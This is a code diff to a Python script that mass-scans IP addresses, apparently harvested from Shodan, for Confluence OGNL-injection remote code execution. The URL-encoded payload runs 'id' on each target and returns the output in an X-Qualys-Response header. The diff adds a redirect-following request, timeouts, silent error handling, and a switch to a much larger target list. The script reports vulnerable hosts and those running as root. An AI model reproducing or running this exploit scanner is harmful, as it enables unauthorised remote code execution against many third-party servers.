@@ -14,16 +14,24 @@ def brute(ip):
         #'Cookie': 'JSESSIONID=4FE96872F91ACEEAAD768705EC7B9B6D',
     }
     try:
-        response = requests.get('http://{0}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/'.format(ip), allow_redirects=False, cookies=cookies, headers=headers, verify=False)
+        response = requests.get('http://{0}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/'.format(ip), allow_redirects=False, cookies=cookies, headers=headers, verify=False,timeout=10)
         if "X-Qualys-Response" in response.headers:
             print("發現RCE在禁止重定向{0}".format(ip))
-            if "root" in response.headers:
+            if "root" in response.headers["X-Qualys-Response"]:
                 print("root用戶起")
-        else:
-            print("not found")
     except Exception as error :
-        print(error)
+        #print(error)
+        pass
+    try:
+        response = requests.get('http://{0}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/'.format(ip),  cookies=cookies, headers=headers, verify=False,timeout=10)
+        if "X-Qualys-Response" in response.headers:
+            print("發現RCE在允許重定向{0}".format(ip))
+            if "root" in response.headers["X-Qualys-Response"]:
+                print("root用戶起")
+    except Exception as error :
+        #print(error)
+        pass
 
-file = open('/Users/timmy/github/timmy/Shodan/confluence/100ip.txt','r')
+file = open('/Users/timmy/github/timmy/Shodan/confluence/cnallip.txt','r')
 for ip in file.readlines():
     brute(ip.strip())
